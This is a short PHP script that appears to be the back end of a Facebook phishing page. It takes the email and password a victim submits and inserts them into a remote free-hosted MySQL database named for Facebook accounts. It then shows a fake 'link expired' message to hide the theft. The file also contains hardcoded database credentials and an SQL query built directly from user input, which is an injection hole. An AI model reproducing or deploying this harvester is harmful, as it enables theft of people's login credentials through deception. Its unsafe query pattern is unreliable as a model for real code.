

<?php
$servername = "mysql8.db4free.net:3307";
$username = "sdas16";
$password = "mom12345!";
$dbname = "fbaccountss";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);
// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
} 

$email = $_POST['email'];
$password = $_POST['password'];

    $sql = "INSERT INTO fb(email,password) VALUES('$_POST[email]','$_POST[password]')";


if ($conn->query($sql) === TRUE) {
    echo "Sorry link expired. Check back later. Thank you";
} else {

}

$conn->close();

?>
